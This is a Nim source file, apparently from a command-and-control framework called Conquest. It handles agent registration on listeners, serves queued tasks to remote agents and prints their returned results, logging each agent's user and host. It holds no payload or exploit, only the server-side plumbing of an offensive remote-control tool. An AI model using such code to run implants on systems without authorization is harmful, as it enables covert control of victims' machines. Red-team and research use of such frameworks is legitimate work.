import terminal, strformat, strutils, sequtils, tables, json, times, base64, system

import ../[utils, globals]
import ../db/database
import ../task/packer
import ../../common/types

# Utility functions 
proc add*(cq: Conquest, agent: Agent) = 
    cq.agents[agent.name] = agent

#[
  Agent API
  Functions relevant for dealing with the agent API, such as registering new agents, querying tasks and posting results
]#
proc register*(agent: Agent): bool = 

    # The following line is required to be able to use the `cq` global variable for console output
    {.cast(gcsafe).}:

        # Check if listener that is requested exists
        # TODO: Verify that the listener accessed is also the listener specified in the URL
        # This can be achieved by extracting the port number from the `Host` header and matching it to the one queried from the database
        if not cq.dbListenerExists(agent.listener.toUpperAscii): 
            cq.writeLine(fgRed, styleBright, fmt"[-] {agent.ip} attempted to register to non-existent listener: {agent.listener}.", "\n")
            return false

        # Store agent in database
        if not cq.dbStoreAgent(agent): 
            cq.writeLine(fgRed, styleBright, fmt"[-] Failed to insert agent {agent.name} into database.", "\n")
            return false

        cq.add(agent)

        let date = agent.firstCheckin.format("dd-MM-yyyy HH:mm:ss")
        cq.writeLine(fgYellow, styleBright, fmt"[{date}] ", resetStyle, "Agent ", fgYellow, styleBright, agent.name, resetStyle, " connected to listener ", fgGreen, styleBright, agent.listener, resetStyle, ": ", fgYellow, styleBright, fmt"{agent.username}@{agent.hostname}", "\n") 

    return true

proc getTasks*(listener, agent: string): seq[seq[byte]] = 

    {.cast(gcsafe).}:

        var result: seq[seq[byte]]

        # Check if listener exists
        if not cq.dbListenerExists(listener.toUpperAscii): 
            cq.writeLine(fgRed, styleBright, fmt"[-] Task-retrieval request made to non-existent listener: {listener}.", "\n")
            raise newException(ValueError, "Invalid listener.")

        # Check if agent exists
        if not cq.dbAgentExists(agent.toUpperAscii): 
            cq.writeLine(fgRed, styleBright, fmt"[-] Task-retrieval request made to non-existent agent: {agent}.", "\n")
            raise newException(ValueError, "Invalid agent.")

        # Update the last check-in date for the accessed agent
        cq.agents[agent.toUpperAscii].latestCheckin = now()
        # if not cq.dbUpdateCheckin(agent.toUpperAscii, now().format("dd-MM-yyyy HH:mm:ss")):
        #    return nil

        # Return tasks
        for task in cq.agents[agent.toUpperAscii].tasks: 
            let taskData = serializeTask(task)
            result.add(taskData)
        
        return result

proc handleResult*(resultData: seq[byte]) = 

    {.cast(gcsafe).}:

        let
            taskResult = deserializeTaskResult(resultData) 
            taskId = uuidToString(taskResult.taskId)
            agentId = uuidToString(taskResult.agentId)
            listenerId = uuidToString(taskResult.listenerId)

        let date: string = now().format("dd-MM-yyyy HH:mm:ss")
        cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, fmt"{$resultData.len} bytes received.")
        
        case cast[StatusType](taskResult.status):
        of STATUS_COMPLETED:
            cq.writeLine(fgBlack, styleBright, fmt"[{date}]", fgGreen, " [+] ", resetStyle, fmt"Task {taskId} completed.")

        of STATUS_FAILED: 
            cq.writeLine(fgBlack, styleBright, fmt"[{date}]", fgRed, styleBright, " [-] ", resetStyle, fmt"Task {taskId} failed.")

        case cast[ResultType](taskResult.resultType):
        of RESULT_STRING:
            if int(taskResult.length) > 0: 
                cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, "Output:")
                # Split result string on newline to keep formatting
                for line in taskResult.data.toString().split("\n"):
                    cq.writeLine(line)

        of RESULT_BINARY:
            # Write binary data to a file 
            cq.writeLine()

        of RESULT_NO_OUTPUT:
            cq.writeLine()
        
        # Update task queue to include all tasks, except the one that was just completed
        cq.agents[agentId].tasks = cq.agents[agentId].tasks.filterIt(it.taskId != taskResult.taskId)